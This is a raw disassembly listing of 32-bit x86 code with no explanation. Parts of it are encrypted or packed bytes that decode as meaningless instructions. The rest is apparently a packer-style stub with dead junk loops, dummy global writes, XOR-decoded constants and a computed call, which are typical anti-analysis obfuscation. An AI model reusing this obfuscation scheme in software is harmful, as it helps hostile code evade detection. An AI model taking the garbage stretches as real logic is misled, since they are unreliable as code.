  40f3e9:	cmp    dl,0xb6
  40f3ec:	rol    bl,0xe4
  40f3ef:	inc    ebp
  40f3f0:	xchg   esi,eax
  40f3f1:	xor    BYTE PTR [ebp-0x17e0abf3],0xc5
  40f3f8:	(bad)  
  40f3f9:	mov    ebx,0x1912f1c9
  40f3fe:	loope  0x40f411
  40f400:	push   eax
  40f401:	jo     0x40f3ce
  40f403:	clc    
  40f404:	out    dx,eax
  40f405:	cmp    edi,DWORD PTR [eax+0x544ba0cd]
  40f40b:	cmp    al,0x71
  40f40d:	and    eax,0xcf4cfb2d
  40f412:	pop    esp
  40f413:	add    ebx,DWORD PTR [edi]
  40f415:	jb     0x40f3b5
  40f417:	test   eax,0x2f68ee4
  40f41c:	addr16 pop edi
  40f41e:	fsubp  st(0),st
  40f420:	and    BYTE PTR [esi],0xd1
  40f423:	sbb    BYTE PTR [ebx+0x47d2f5fa],dh
  40f429:	jns    0x40f3b6
  40f42b:	pushf  
  40f42c:	out    0xbb,al
  40f42e:	xor    al,0xc6
  40f430:	xchg   ecx,eax
  40f431:	lds    edx,FWORD PTR [edx]
  40f433:	add    eax,DWORD PTR [eax]
  40f435:	push   ebp
  40f436:	ret    
  40f437:	sbb    dl,BYTE PTR [ebp-0x260b2067]
  40f43d:	call   0xe930:0x92d45fad
  40f444:	mov    WORD PTR [eax+0x79],es
  40f447:	xchg   edx,eax
  40f448:	mov    ds:0x47996d8d,al
  40f44d:	inc    edx
  40f44e:	mov    ebx,0x692853e1
  40f453:	push   ebx
  40f454:	adc    bl,BYTE PTR [edi-0x1481abbb]
  40f45a:	sahf   
  40f45b:	stos   BYTE PTR es:[edi],al
  40f45c:	(bad)  
  40f45d:	mov    bl,0x97
  40f45f:	or     BYTE PTR [ecx-0x1927c0d1],dl
  40f465:	aad    0x89
  40f467:	retf   
  40f468:	cli    
  40f469:	sbb    BYTE PTR [ebx+0x6a41cbdd],bh
  40f46f:	ret    0xd35
  40f472:	cld    
  40f473:	xor    dh,BYTE PTR [esi+ecx*2-0x75]
  40f477:	xor    edi,0xffffffa0
  40f47a:	std    
  40f47b:	test   al,0xdf
  40f47d:	retf   0x4a4d
  40f480:	xchg   esi,eax
  40f481:	mov    al,ds:0xa80d2710
  40f486:	inc    edi
  40f487:	pop    ebx
  40f488:	popf   
  40f489:	mov    ebp,0x7bada03b
  40f48e:	xor    edx,0x60
  40f491:	retf   0x91c1
  40f494:	and    BYTE PTR [edi-0x2],al
  40f497:	jmp    0x1dec:0xac682cc8
  40f49e:	rol    DWORD PTR [esi-0x2ca19735],0x39
  40f4a5:	push   es
  40f4a6:	mov    esi,0x57c19a34
  40f4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4ac:	lahf   
  40f4ad:	adc    dh,BYTE PTR [edx+0x22]
  40f4b0:	stos   DWORD PTR es:[edi],eax
  40f4b1:	outs   dx,BYTE PTR ds:[esi]
  40f4b2:	mov    eax,ds:0xe8c428bf
  40f4b7:	push   ecx
  40f4b8:	mov    dl,0x69
  40f4ba:	ret    0x5347
  40f4bd:	and    al,BYTE PTR [edi-0x2c3e9464]
  40f4c3:	adc    ch,bl
  40f4c5:	out    dx,eax
  40f4c6:	cmp    ebp,DWORD PTR [edi+0x4f]
  40f4c9:	sti    
  40f4ca:	or     eax,0x222f4b61
  40f4cf:	mov    edi,0x7151f825
  40f4d4:	inc    esp
  40f4d5:	and    DWORD PTR [eax+0x266896b8],edi
  40f4db:	mov    DWORD PTR [ebp-0x7c668bb7],ebp
  40f4e1:	sub    eax,DWORD PTR [ecx+0x40]
  40f4e4:	jno    0x40f47d
  40f4e6:	lahf   
  40f4e7:	push   ecx
  40f4e8:	mov    eax,ecx
  40f4ea:	sub    eax,DWORD PTR [eax-0x24790f29]
  40f4f0:	xor    eax,0x317777c0
  40f4f5:	push   ss
  40f4f6:	(bad)  
  40f4f7:	dec    DWORD PTR [ebx]
  40f4f9:	pop    ebx
  40f4fa:	push   ecx
  40f4fb:	stos   DWORD PTR es:[edi],eax
  40f4fc:	add    BYTE PTR [eax+0x4061e394],dh
  40f502:	cmp    al,0x55
  40f504:	mov    BYTE PTR [ebp+0x1a835f10],ah
  40f50a:	and    DWORD PTR [edi],eax
  40f50c:	xchg   edi,eax
  40f50d:	xor    BYTE PTR [ebx+0x70],cl
  40f510:	add    dh,dh
  40f512:	gs jb  0x40f496
  40f515:	aad    0xa7
  40f517:	out    0x5f,al
  40f519:	or     dl,bl
  40f51b:	retf   
  40f51c:	pop    edi
  40f51d:	jge    0x40f571
  40f51f:	repnz or dh,BYTE PTR [edi]
  40f522:	outs   dx,BYTE PTR ds:[esi]
  40f523:	aaa    
  40f524:	inc    edx
  40f525:	fstp   DWORD PTR [ebx-0x3a0c2f15]
  40f52b:	sbb    eax,0xdfc3fb3a
  40f530:	fist   WORD PTR fs:[eax+0x5ff592da]
  40f537:	or     DWORD PTR [edi-0x142fc8a5],eax
  40f53d:	xchg   BYTE PTR [ecx],dh
  40f53f:	and    dl,ah
  40f541:	popa   
  40f542:	inc    edi
  40f543:	rcl    BYTE PTR [edx],0x8c
  40f546:	scas   al,BYTE PTR es:[edi]
  40f547:	pop    edx
  40f548:	sbb    eax,0xc9e8be33
  40f54d:	jne    0x40f4ea
  40f54f:	fisub  WORD PTR [ecx+0x22]
  40f552:	call   0x3c20:0x75155525
  40f559:	sbb    eax,0xd835dee0
  40f55e:	mov    ah,0x85
  40f560:	pop    eax
  40f561:	xchg   BYTE PTR [ecx],bh
  40f563:	adc    DWORD PTR [eax-0x1d822754],eax
  40f569:	jmp    0x40f5b7
  40f56b:	xchg   esi,eax
  40f56c:	je     0x40f540
  40f56e:	mov    bl,0xde
  40f570:	mov    bh,0x8e
  40f572:	sub    bl,bh
  40f574:	cs push ebp
  40f576:	or     ebp,esp
  40f578:	add    al,0xe2
  40f57a:	test   eax,0x898c9675
  40f57f:	(bad)  
  40f580:	cmp    eax,0x65b8edc4
  40f585:	jo     0x40f570
  40f587:	mov    ds,WORD PTR [esi-0x28]
  40f58a:	retf   
  40f58b:	add    DWORD PTR [ecx-0x38],edi
  40f58e:	shl    BYTE PTR [ebx],1
  40f590:	ret    0x2c94
  40f593:	and    cl,BYTE PTR [eax+0x3b]
  40f596:	mov    ds:0xafdfd61b,eax
  40f59b:	fmul   QWORD PTR ss:[esi-0x51]
  40f59f:	adc    al,0xdf
  40f5a1:	sahf   
  40f5a2:	xor    edx,DWORD PTR [esi+edi*1]
  40f5a5:	jae    0x40f5c7
  40f5a7:	cld    
  40f5a8:	or     cl,BYTE PTR [ecx]
  40f5aa:	jno    0x40f5f1
  40f5ac:	adc    ebp,DWORD PTR [ebx+0x56]
  40f5af:	xchg   esi,eax
  40f5b0:	pop    es
  40f5b1:	mov    dl,0x95
  40f5b3:	add    DWORD PTR [edi],ecx
  40f5b5:	xor    edx,esp
  40f5b7:	push   ebp
  40f5b8:	fdiv   DWORD PTR [eax+eiz*4]
  40f5bb:	sti    
  40f5bc:	mov    esi,0x7c60c691
  40f5c1:	mov    esp,0x515bd346
  40f5c6:	jle    0x40f59b
  40f5c8:	push   ebx
  40f5c9:	mov    ds:0x378b6ac0,al
  40f5ce:	push   ebp
  40f5cf:	mov    BYTE PTR ds:0x87c8c60f,cl
  40f5d5:	inc    eax
  40f5d6:	mov    esi,0xa61f5fc6
  40f5db:	push   es
  40f5dc:	mov    esi,?
  40f5de:	sub    ebx,DWORD PTR ds:0xb7e06943
  40f5e4:	mov    ?,WORD PTR [eax+eiz*2]
  40f5e7:	out    0x32,eax
  40f5e9:	outs   dx,BYTE PTR ds:[esi]
  40f5ea:	inc    eax
  40f5eb:	dec    ebx
  40f5ec:	loop   0x40f65e
  40f5ee:	jp     0x40f5be
  40f5f0:	mov    ecx,0xbe5c2361
  40f5f5:	cli    
  40f5f6:	mov    bh,0x30
  40f5f8:	shl    DWORD PTR ds:0xcfa5d027,cl
  40f5fe:	mov    bh,0x22
  40f600:	stos   DWORD PTR es:[edi],eax
  40f601:	out    dx,al
  40f602:	add    BYTE PTR [eax-0x1ad7bbe9],cl
  40f608:	and    ebx,esp
  40f60a:	test   DWORD PTR [ebx],edx
  40f60c:	mov    ebx,0x307fc82c
  40f611:	aam    0x6b
  40f613:	repnz sbb dl,BYTE PTR [esi+0x1cda95ae]
  40f61a:	cmc    
  40f61b:	mov    DWORD PTR ds:0x970e7a40,eax
  40f621:	mov    BYTE PTR [edx],ah
  40f623:	xor    al,0xba
  40f625:	mov    esp,0x9b2a1bbd
  40f62a:	cmp    ecx,DWORD PTR [edx+0x6b]
  40f62d:	jmp    0x40f5d4
  40f62f:	sub    al,0xb5
  40f631:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f633:	lods   al,BYTE PTR ds:[esi]
  40f634:	addr16 pusha 
  40f636:	inc    DWORD PTR [edi+0x56db33f3]
  40f63c:	mov    esi,ebx
  40f63e:	pop    ebx
  40f63f:	mov    edx,esi
  40f641:	add    ebx,0x1002
  40f647:	lea    eax,[ebp-0x18]
  40f64a:	add    edx,eax
  40f64c:	add    edx,0x5
  40f64f:	push   edx
  40f650:	inc    esi
  40f651:	pop    ecx
  40f652:	dec    ecx
  40f653:	xchg   ecx,eax
  40f654:	dec    eax
  40f655:	xchg   ecx,eax
  40f656:	dec    ecx
  40f657:	xchg   ecx,edx
  40f659:	dec    edx
  40f65a:	push   edx
  40f65b:	mov    edx,ebx
  40f65d:	pop    ebx
  40f65e:	dec    ebx
  40f65f:	call   DWORD PTR [ebx]
  40f661:	cmp    DWORD PTR [ebp+0x10],esi
  40f664:	je     0x40f685
  40f66a:	xchg   edx,eax
  40f66b:	push   0xc
  40f66d:	pop    ecx
  40f66e:	dec    ecx
  40f66f:	push   0x3
  40f671:	pop    ebx
  40f672:	inc    ebx
  40f673:	xchg   ebx,ecx
  40f675:	inc    ecx
  40f676:	sub    ebx,ecx
  40f678:	xchg   ebx,ecx
  40f67a:	dec    ecx
  40f67b:	dec    ecx
  40f67c:	mov    eax,DWORD PTR [ebp-0x1c]
  40f67f:	imul   eax,ecx
  40f682:	add    esp,eax
  40f684:	xchg   edx,eax
  40f685:	push   eax
  40f686:	xor    ebx,ebx
  40f688:	mov    edx,esp
  40f68a:	dec    edx
  40f68b:	inc    ebx
  40f68c:	add    ebx,DWORD PTR [edx+ebx*1]
  40f68f:	dec    ebx
  40f690:	xor    edx,edx
  40f692:	add    DWORD PTR [ebp-0x10],ebx
  40f695:	pop    ebx
  40f696:	mov    eax,DWORD PTR [ebp-0x10]
  40f699:	pop    edi
  40f69a:	pop    esi
  40f69b:	pop    ebx
  40f69c:	leave  
  40f69d:	ret    0x10
  40f6a0:	push   ebp
  40f6a1:	mov    ebp,esp
  40f6a3:	push   ecx
  40f6a4:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40f6ab:	xor    DWORD PTR ds:0x428eb1,0x6807
  40f6b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f6b8:	mov    edx,DWORD PTR [ebp+0x10]
  40f6bb:	mov    ecx,0x75108b1
  40f6c0:	xor    eax,ecx
  40f6c2:	add    eax,0x3272f8
  40f6c7:	mov    DWORD PTR [edx],eax
  40f6c9:	mov    eax,DWORD PTR [ebp+0xc]
  40f6cc:	xor    eax,ecx
  40f6ce:	or     DWORD PTR ds:0x428e95,0x4274
  40f6d8:	push   esi
  40f6d9:	xor    edx,DWORD PTR ds:0x428e25
  40f6df:	mov    esi,DWORD PTR [ebp+0x10]
  40f6e2:	mov    edx,0x3272f8
  40f6e7:	sub    DWORD PTR ds:0x428e35,0x428e89
  40f6f1:	add    eax,edx
  40f6f3:	mov    DWORD PTR [esi+0x4],eax
  40f6f6:	mov    eax,DWORD PTR [ebp+0x14]
  40f6f9:	sub    DWORD PTR ds:0x428e6d,0x71ec
  40f703:	mov    esi,DWORD PTR [ebp+0x10]
  40f706:	xor    DWORD PTR ds:0x428e75,0xbd4
  40f710:	mov    DWORD PTR [esi+0x8],eax
  40f713:	mov    eax,DWORD PTR [ebp+0x18]
  40f716:	mov    esi,DWORD PTR [ebp+0x10]
  40f719:	sub    DWORD PTR ds:0x428e31,0x4173
  40f723:	mov    DWORD PTR [esi+0xc],eax
  40f726:	add    esi,0x59ec
  40f72c:	mov    eax,DWORD PTR [ebp+0x1c]
  40f72f:	mov    esi,DWORD PTR [ebp+0x10]
  40f732:	mov    DWORD PTR [esi+0x10],eax
  40f735:	mov    eax,DWORD PTR [ebp+0x8]
  40f738:	xor    eax,ecx
  40f73a:	add    eax,edx
  40f73c:	pop    esi
  40f73d:	leave  
  40f73e:	ret    0x18
  40f741:	push   ebp
  40f742:	mov    ebp,esp
  40f744:	sub    esp,0x9c
  40f74a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f74d:	sbb    DWORD PTR ds:0x428e9d,edx
  40f753:	mov    eax,0x8a9c
  40f758:	sbb    DWORD PTR ds:0x428ed1,0x428ec1
  40f762:	xor    ax,WORD PTR [ecx+0x20]
  40f766:	and    DWORD PTR ds:0x428e65,ebx
  40f76c:	mov    ecx,0x3b5e
  40f771:	add    ax,cx
  40f774:	movzx  eax,ax
  40f777:	xor    ecx,DWORD PTR ds:0x428e89
  40f77d:	mov    DWORD PTR [ebp-0x10],eax
  40f780:	mov    BYTE PTR [ebp-0x1],0x7c
  40f784:	and    DWORD PTR ds:0x428e9d,0x0
  40f78e:	mov    ecx,DWORD PTR ds:0x428e9d
  40f794:	inc    ecx
  40f795:	mov    DWORD PTR ds:0x428e9d,ecx
  40f79b:	cmp    DWORD PTR ds:0x428e9d,0x25
  40f7a2:	ja     0x40f7ce
  40f7a8:	jmp    0x40f7c1
  40f7ad:	push   0x762d
  40f7b2:	push   DWORD PTR [ebp-0x1c]
  40f7b5:	push   DWORD PTR [ebp-0x10]
  40f7b8:	push   DWORD PTR [ebp-0x1c]
  40f7bb:	call   DWORD PTR ds:0x42ca3c
  40f7c1:	cmp    DWORD PTR ds:0x428e9d,0x1d
  40f7c8:	jb     0x40f78e
  40f7ce:	lea    eax,[ebp-0x1]
  40f7d1:	mov    DWORD PTR [ebp-0xc],eax
  40f7d4:	mov    DWORD PTR ds:0x428e65,0x1c
  40f7de:	cmp    DWORD PTR ds:0x428e65,0x0
  40f7e5:	je     0x40f82d
  40f7eb:	cmp    DWORD PTR ds:0x428e65,0x22
  40f7f2:	jle    0x40f82d
  40f7f8:	jmp    0x40f819
  40f7fd:	push   0x5d70
  40f802:	push   DWORD PTR [ebp-0x24]
  40f805:	push   DWORD PTR [ebp-0x20]
  40f808:	push   DWORD PTR [ebp-0x28]
  40f80b:	push   0x428104
  40f810:	push   DWORD PTR [ebp-0x24]
  40f813:	call   DWORD PTR ds:0x42ca10
  40f819:	xor    ecx,ecx
  40f81b:	or     ecx,DWORD PTR ds:0x428e65
  40f821:	dec    ecx
  40f822:	mov    DWORD PTR ds:0x428e65,ecx
  40f828:	jmp    0x40f7de
  40f82d:	mov    al,BYTE PTR [ebp-0x1]
  40f830:	add    DWORD PTR ds:0x428e95,edi
  40f836:	mov    ecx,DWORD PTR [ebp-0xc]
  40f839:	xor    al,0x80
  40f83b:	sub    DWORD PTR ds:0x428ebd,0x428e99
  40f845:	add    al,0x5
  40f847:	sbb    DWORD PTR ds:0x428e29,0x428ead
  40f851:	mov    BYTE PTR [ecx],al
  40f853:	mov    DWORD PTR ds:0x428eb1,0x18
  40f85d:	cmp    DWORD PTR ds:0x428eb1,0x0
  40f864:	je     0x40f8ba
  40f86a:	cmp    DWORD PTR ds:0x428eb1,0xc
  40f871:	jl     0x40f8ba
  40f877:	jmp    0x40f88c
  40f87c:	push   0x428009
  40f881:	push   DWORD PTR [ebp-0x28]
  40f884:	push   0x0
  40f886:	call   DWORD PTR ds:0x42ca4c
  40f88c:	cmp    DWORD PTR ds:0x428eb1,0xd
  40f893:	jne    0x40f8a6
  40f899:	mov    ecx,DWORD PTR ds:0x428eb1
  40f89f:	dec    ecx
  40f8a0:	mov    DWORD PTR ds:0x428eb1,ecx
  40f8a6:	xor    ecx,ecx
  40f8a8:	add    ecx,DWORD PTR ds:0x428eb1
  40f8ae:	dec    ecx
  40f8af:	mov    DWORD PTR ds:0x428eb1,ecx
  40f8b5:	jmp    0x40f85d
  40f8ba:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40f8c1:	push   ebx
  40f8c2:	mov    DWORD PTR ds:0x428e59,0x10
  40f8cc:	cmp    DWORD PTR ds:0x428e59,0x0
  40f8d3:	je     0x40f909
  40f8d9:	cmp    DWORD PTR ds:0x428e59,0x12
  40f8e0:	jg     0x40f909
  40f8e6:	jmp    0x40f8f6
  40f8eb:	push   0x21fb
  40f8f0:	call   DWORD PTR ds:0x42ca50
  40f8f6:	xor    eax,eax
  40f8f8:	or     eax,DWORD PTR ds:0x428e59
  40f8fe:	dec    eax
  40f8ff:	mov    ds:0x428e59,eax
  40f904:	jmp    0x40f8cc
  40f909:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  40f910:	mov    ecx,DWORD PTR [ebp-0x18]
  40f913:	push   esi
  40f914:	mov    eax,0x75108b1
  40f919:	and    DWORD PTR ds:0x428e8d,0x6e27
  40f923:	xor    ecx,eax
  40f925:	or     esi,DWORD PTR ds:0x428e41
  40f92b:	mov    esi,0x3272f8
  40f930:	sbb    DWORD PTR ds:0x428e65,0x3911
  40f93a:	push   edi
  40f93b:	add    ecx,esi
  40f93d:	jmp    0x40f957
  40f942:	mov    dl,BYTE PTR [ebp-0x1]
  40f945:	mov    DWORD PTR ds:0x428ea5,0x4ad2
  40f94f:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f956:	inc    ecx
  40f957:	cmp    ecx,0x40
  40f95a:	mov    DWORD PTR ds:0x428ec9,0x10ec
  40f964:	jb     0x40f942
  40f96a:	not    edx
  40f96c:	mov    edx,DWORD PTR [ebp-0x18]
  40f96f:	or     DWORD PTR ds:0x428e95,0x5092
  40f979:	xor    edx,eax
  40f97b:	sbb    DWORD PTR ds:0x428e7d,0x7f40
  40f985:	add    edx,esi
  40f987:	mov    DWORD PTR ds:0x428e35,0x3958
  40f991:	jmp    0x40fa14
  40f996:	sbb    ecx,DWORD PTR ds:0x428e6d
  40f99c:	mov    edi,DWORD PTR [ebp+0x8]
  40f99f:	sub    DWORD PTR ds:0x428e2d,0x7feb
  40f9a9:	mov    ecx,0x8a9c
  40f9ae:	sbb    DWORD PTR ds:0x428e25,0x428e91
  40f9b8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f9bd:	or     DWORD PTR ds:0x428e2d,0x498b
  40f9c7:	mov    edi,0x3b5e
  40f9cc:	or     DWORD PTR ds:0x428e49,0x428e35
  40f9d6:	add    cx,di
  40f9d9:	movzx  ecx,cx
  40f9dc:	mov    DWORD PTR [ebp-0xc],ecx
  40f9df:	and    DWORD PTR ds:0x428ec9,ecx
  40f9e5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9e8:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f9ec:	add    DWORD PTR ds:0x428e71,0x1e66
  40f9f6:	xor    ecx,0x8a9c
  40f9fc:	add    ecx,edi
  40f9fe:	inc    edi
  40f9ff:	mov    edi,DWORD PTR [ebp-0xc]
  40fa02:	mov    DWORD PTR ds:0x428e49,0x2418
  40fa0c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fa13:	inc    edx
  40fa14:	mov    DWORD PTR ds:0x428e81,ecx
  40fa1a:	mov    ecx,DWORD PTR [ebp-0x10]
  40fa1d:	mov    DWORD PTR ds:0x428e61,0x6126
  40fa27:	cmp    edx,ecx
  40fa29:	jne    0x40f996
  40fa2f:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa32:	and    DWORD PTR ds:0x428ec9,0x0
  40fa3c:	jmp    0x40fa50
  40fa41:	xor    edi,edi
  40fa43:	or     edi,DWORD PTR ds:0x428ec9
  40fa49:	inc    edi
  40fa4a:	mov    DWORD PTR ds:0x428ec9,edi
  40fa50:	cmp    DWORD PTR ds:0x428ec9,0x19
  40fa57:	jae    0x40fa87
  40fa5d:	cmp    DWORD PTR ds:0x428ec9,0x28
  40fa64:	jbe    0x40fa87
  40fa6a:	jmp    0x40fa82
  40fa6f:	push   DWORD PTR [ebp-0x20]
  40fa72:	push   0x428104
  40fa77:	push   0x428eb9
  40fa7c:	call   DWORD PTR ds:0x42ca54
  40fa82:	jmp    0x40fa41
  40fa87:	mov    edx,DWORD PTR [ebp+0x10]
  40fa8a:	mov    edi,DWORD PTR ds:0x428e55
  40fa90:	sub    DWORD PTR ds:0x428e75,edi
  40fa96:	xor    ecx,eax
  40fa98:	add    ecx,esi
  40fa9a:	neg    edi
  40fa9c:	mov    DWORD PTR [edx],ecx
  40fa9e:	and    DWORD PTR ds:0x428e49,0x0
  40faa8:	jmp    0x40faba
  40faad:	mov    ecx,DWORD PTR ds:0x428e49
  40fab3:	inc    ecx
  40fab4:	mov    DWORD PTR ds:0x428e49,ecx
  40faba:	cmp    DWORD PTR ds:0x428e49,0x1d
  40fac1:	jae    0x40faf7
  40fac7:	cmp    DWORD PTR ds:0x428e49,0x21
  40face:	jb     0x40faf7
  40fad4:	jmp    0x40faf2
  40fad9:	push   DWORD PTR [ebp-0x14]
  40fadc:	push   DWORD PTR [ebp-0x28]
  40fadf:	push   0x4b8c
  40fae4:	push   DWORD PTR [ebp-0x18]
  40fae7:	push   0x428e9d
  40faec:	call   DWORD PTR ds:0x42ca14
  40faf2:	jmp    0x40faad
  40faf7:	mov    ecx,DWORD PTR [ebp-0x18]
  40fafa:	xor    ecx,eax
  40fafc:	add    ecx,esi
  40fafe:	neg    edi
  40fb00:	mov    DWORD PTR [ebp-0xc],ecx
  40fb03:	or     DWORD PTR ds:0x428e59,edx
  40fb09:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  40fb10:	movzx  edi,BYTE PTR ds:0x428e35
  40fb17:	or     edi,DWORD PTR ds:0x428ec5
  40fb1d:	mov    DWORD PTR ds:0x428e35,edi
  40fb23:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  40fb2a:	and    DWORD PTR ds:0x428e81,0x0
  40fb34:	jmp    0x40fb46
  40fb39:	mov    ecx,DWORD PTR ds:0x428e81
  40fb3f:	inc    ecx
  40fb40:	mov    DWORD PTR ds:0x428e81,ecx
  40fb46:	cmp    DWORD PTR ds:0x428e81,0x1b
  40fb4d:	jae    0x40fb94
  40fb53:	cmp    DWORD PTR ds:0x428e81,0xa
  40fb5a:	jbe    0x40fb94
  40fb60:	jmp    0x40fb75
  40fb65:	push   0x3736
  40fb6a:	push   0x7077
  40fb6f:	call   DWORD PTR ds:0x42ca18
  40fb75:	cmp    DWORD PTR ds:0x428e81,0x9
  40fb7c:	jne    0x40fb8f
  40fb82:	mov    ecx,DWORD PTR ds:0x428e81
  40fb88:	inc    ecx
  40fb89:	mov    DWORD PTR ds:0x428e81,ecx
  40fb8f:	jmp    0x40fb39
  40fb94:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  40fb9b:	and    DWORD PTR ds:0x428e35,0x0
  40fba5:	jmp    0x40fbb7
  40fbaa:	mov    ecx,DWORD PTR ds:0x428e35
  40fbb0:	inc    ecx
  40fbb1:	mov    DWORD PTR ds:0x428e35,ecx
  40fbb7:	cmp    DWORD PTR ds:0x428e35,0x11
  40fbbe:	jae    0x40fc0b
  40fbc4:	cmp    DWORD PTR ds:0x428e35,0x5
  40fbcb:	jge    0x40fc0b
  40fbd1:	jmp    0x40fbec
  40fbd6:	push   DWORD PTR [ebp-0xc]
  40fbd9:	push   DWORD PTR [ebp-0x18]
  40fbdc:	push   0x1f27
  40fbe1:	push   0x4d22
  40fbe6:	call   DWORD PTR ds:0x42ca58
  40fbec:	cmp    DWORD PTR ds:0x428e35,0x4
  40fbf3:	jne    0x40fc06
  40fbf9:	mov    ecx,DWORD PTR ds:0x428e35
  40fbff:	inc    ecx
  40fc00:	mov    DWORD PTR ds:0x428e35,ecx
  40fc06:	jmp    0x40fbaa
  40fc0b:	mov    ecx,DWORD PTR [ebp-0x14]
  40fc0e:	xor    edi,edi
  40fc10:	add    edi,DWORD PTR ds:0x428e95
  40fc16:	xor    DWORD PTR ds:0x428e41,edi
  40fc1c:	mov    DWORD PTR [ebp+0x8],ecx
  40fc1f:	adc    DWORD PTR ds:0x428e31,ebx
  40fc25:	mov    ecx,DWORD PTR [ebp+0x8]
  40fc28:	adc    DWORD PTR ds:0x428e39,0x50fd
  40fc32:	xor    ecx,eax
  40fc34:	or     DWORD PTR ds:0x428e49,0x428e31
  40fc3e:	add    ecx,esi
  40fc40:	mov    ecx,0xf641bea
  40fc45:	mov    edi,0x15c3
  40fc4a:	mov    edi,0x5a1eade
  40fc4f:	je     0x412616
  40fc55:	add    edx,ebx
  40fc57:	mov    edx,DWORD PTR [ebp+0x8]
  40fc5a:	and    DWORD PTR ds:0x428eb5,0x428e6d
  40fc64:	mov    ebx,DWORD PTR [ebp-0x8]
  40fc67:	xor    edx,eax
  40fc69:	adc    DWORD PTR ds:0x428e49,0x78c3
  40fc73:	xor    ebx,eax
  40fc75:	sub    edx,ebx
  40fc77:	not    DWORD PTR ds:0x428e65
  40fc7d:	sub    edx,esi
  40fc7f:	xor    edx,eax
  40fc81:	sub    DWORD PTR ds:0x428ec1,ebx
  40fc87:	mov    DWORD PTR [ebp+0x8],edx
  40fc8a:	mov    DWORD PTR ds:0x428e81,0x18
  40fc94:	cmp    DWORD PTR ds:0x428e81,0x0
  40fc9b:	je     0x40fcef
  40fca1:	cmp    DWORD PTR ds:0x428e81,0x9
  40fca8:	jg     0x40fcef
  40fcae:	jmp    0x40fcc1
  40fcb3:	push   DWORD PTR [ebp-0x1c]
  40fcb6:	push   0x8c8f
  40fcbb:	call   DWORD PTR ds:0x42ca1c
  40fcc1:	cmp    DWORD PTR ds:0x428e81,0xa
  40fcc8:	jne    0x40fcdd
  40fcce:	xor    edx,edx
  40fcd0:	xor    edx,DWORD PTR ds:0x428e81
  40fcd6:	dec    edx
  40fcd7:	mov    DWORD PTR ds:0x428e81,edx
  40fcdd:	mov    edx,DWORD PTR ds:0x428e81
  40fce3:	dec    edx
  40fce4:	mov    DWORD PTR ds:0x428e81,edx
  40fcea:	jmp    0x40fc94
  40fcef:	mov    edx,DWORD PTR [ebp+0x8]
  40fcf2:	adc    ebx,0x7b56
  40fcf8:	mov    ebx,DWORD PTR [ebp-0x58]
  40fcfb:	sub    DWORD PTR ds:0x428ea9,0xceb
  40fd05:	lea    edx,[ebx+edx*1+0x5708f8]
  40fd0c:	mov    DWORD PTR ds:0x428e91,0x63b8
  40fd16:	mov    DWORD PTR [ebp-0x58],edx
  40fd19:	mov    edx,DWORD PTR [ebp+0x8]
  40fd1c:	mov    ebx,DWORD PTR [ebp-0x54]
  40fd1f:	add    edx,0x64f89a
  40fd25:	adc    DWORD PTR ds:0x428e6d,0x428e79
  40fd2f:	imul   edx,ebx
  40fd32:	mov    DWORD PTR [ebp-0x54],edx
  40fd35:	xor    ebx,edx
  40fd37:	mov    edx,DWORD PTR [ebp+0x8]
  40fd3a:	xor    DWORD PTR ds:0x428e75,0x629e
  40fd44:	mov    ebx,DWORD PTR [ebp-0x50]
  40fd47:	mov    DWORD PTR ds:0x428ea5,0x655f
  40fd51:	add    edx,0x242ebed
  40fd57:	mov    DWORD PTR ds:0x428e49,0x3be8
  40fd61:	and    edx,ebx
  40fd63:	and    DWORD PTR ds:0x428e5d,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ebx,DWORD PTR ds:0x428e5d
  40fd78:	inc    ebx
  40fd79:	mov    DWORD PTR ds:0x428e5d,ebx
  40fd7f:	cmp    DWORD PTR ds:0x428e5d,0x1e
  40fd86:	jae    0x412148
  40fd8c:	cmp    DWORD PTR ds:0x428e5d,0x8
  40fd93:	ja     0x412148
  40fd99:	jmp    0x40fdae
  40fd9e:	push   0x4280dc
  40fda3:	push   0x2c09
  40fda8:	call   DWORD PTR ds:0x42ca20
  40fdae:	cmp    DWORD PTR ds:0x428e5d,0x7
  40fdb5:	jne    0x40fdca
  40fdbb:	xor    ebx,ebx
  40fdbd:	xor    ebx,DWORD PTR ds:0x428e5d
  40fdc3:	inc    ebx
  40fdc4:	mov    DWORD PTR ds:0x428e5d,ebx
  40fdca:	jmp    0x40fd72
  40fdcf:	jmp    0x412148
  40fdd4:	xadd   edi,edi
  40fdd7:	dec    ebx
  40fdd8:	push   ecx
  40fdd9:	dec    ebp
  40fdda:	dec    edi
  40fddb:	sar    eax,0xe5
  40fdde:	mov    al,ah
  40fde0:	arpl   sp,bx
  40fde2:	ins    DWORD PTR es:[edi],dx
  40fde3:	dec    ebp
  40fde4:	mov    dl,0x4f
  40fde6:	jnp    0x40fe63
  40fde8:	xlat   BYTE PTR ds:[ebx]
  40fde9:	sahf   
  40fdea:	jnp    0x40fe67
  40fdec:	lods   eax,DWORD PTR ds:[esi]
  40fded:	push   ecx
  40fdee:	les    edi,FWORD PTR [esi+0x38]
  40fdf1:	adc    eax,0xd76962f5
  40fdf6:	fmul   DWORD PTR [ebx+eiz*1-0x1f]
  40fdfa:	pushf  
  40fdfb:	push   es
  40fdfc:	stos   BYTE PTR es:[edi],al
  40fdfd:	mov    esi,0x160eb867
  40fe02:	arpl   bp,ax
  40fe04:	jmp    DWORD PTR [esi-0x9fd60e2]
  40fe0a:	scas   eax,DWORD PTR es:[edi]
  40fe0b:	xlat   BYTE PTR ds:[ebx]
  40fe0c:	mov    esp,0x7f6d08a2
  40fe11:	mov    bl,0x3
  40fe13:	jne    0x40fe04
  40fe15:	pop    edx
  40fe16:	mov    ah,0xc4
